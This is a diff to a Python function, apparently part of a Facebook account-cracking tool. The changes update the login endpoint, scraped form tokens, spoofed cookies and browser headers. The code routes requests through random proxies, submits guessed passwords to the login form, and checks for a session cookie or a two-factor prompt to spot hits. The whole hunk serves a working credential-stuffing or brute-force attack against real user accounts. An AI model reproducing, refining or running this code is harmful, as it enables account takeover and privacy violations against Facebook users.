@@ -1238,56 +1238,53 @@ def mbasic(uid,pwx,tl):
             nip=random.choice(xvx)
             proxs= {'http': nip}
             Session = requests.Session()
-            free_fb = Session.get('https://web.facebook.com').text
+            free_fb = Session.get('https://free.facebook.com').text
             data = {
             'email': uid,
             'cuid': '',
-            'guid': 'fb7404dba7e608451',
-            'lgnjs': '1737540923',
-            'lgnrnd': '021522_4xQK',
+            'guid': 'f5841e35864586445',
+            'lgnjs': '1737636447',
+            'lgnrnd': '044726_XZdz',
             'locale': 'en_GB',
             'login_source': 'comet_login_header',
-            'next': 'https://en-gb.facebook.com/logi',
+            'next': 'https://web.facebook.com/_mmr=1&_rdr',
             'skstamp': '',
             'timezone': '-330',
             'prefill_contact_point': '',
             'prefill_source': '',
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'ab_test_data': '/AAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAA/AAAAA/ABAAH',
+            'lgndim': '{"w":1440,"h":900,"aw":1440,"ah":860,"c":24}',
+            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAA/AAMMAAAABFAB',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
-            'datr': 'J8WQZ2hHEyeyTAnXhk5DXagj',
-            'sb': 'J8WQZ6GYMk5K4egLv4wduS9c',
-            'locale': 'en_GB',
-            'fr': '07jIkucEzeEJpR9Gg.AWW3Cbic7HbnTE3oGhj79mvQLvI.Bnix4g..AAA.0.0.BnkMUr.AWWQnzNij5Q',
-            'wd': '1090x773',}
+            'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnkjpO.AWU0Eyw6VzU',
+            'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
+            'ps_l': '1',
+            'ps_n': '1',
+            'wd': '1440x402',
+            'usida': 'eyJ2ZXIiOjEsImlkIjoiQXNxamt1YjFua3hiNjYiLCJ0aW1lIjoxNzM3NjM2NDE5fQ^%^3D^%^3D',}
             headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '1',
-            'origin': 'https://en-gb.facebook.com',
-            'priority': 'u=0, i',
-            'referer': 'https://en-gb.facebook.com/logi',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.265", "Chromium";v="131.0.6778.265", "Not_A Brand";v="24.0.0.0"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
-            'viewport-width': '1090',}
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://web.facebook.com',
+            'DNT': '1',
+            'Alt-Used': 'web.facebook.com',
+            'Connection': 'keep-alive',
+            'Referer': 'https://web.facebook.com/_mmr=1&_rdr',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Priority': 'u=0, i',
+            'Pragma': 'no-cache',
+            'Cache-Control': 'no-cache',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110'
+            url = 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
